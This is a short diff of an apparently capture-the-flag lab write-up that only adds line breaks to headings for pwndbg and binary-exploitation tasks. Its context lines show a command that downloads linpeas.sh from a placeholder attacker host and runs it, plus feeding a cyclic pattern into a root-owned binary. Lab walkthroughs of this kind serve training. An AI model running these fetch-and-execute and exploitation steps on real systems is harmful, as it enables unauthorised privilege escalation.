@@ -61,9 +61,9 @@
 - wget http://{IP}/linpeas.sh
 - ./linpeas.sh 
 ```
-***TASK 7: pwndbg***
-***TASK 8: Binary-Exploitation : Manually***
-***TASK 9: Binary-Exploitation : The pwntools way***
+***TASK 7: pwndbg*** <br>
+***TASK 8: Binary-Exploitation : Manually*** <br>
+***TASK 9: Binary-Exploitation : The pwntools way*** <br>
 ```
 1. cyclic 50
 2. echo "cyclic 50" | ./root2
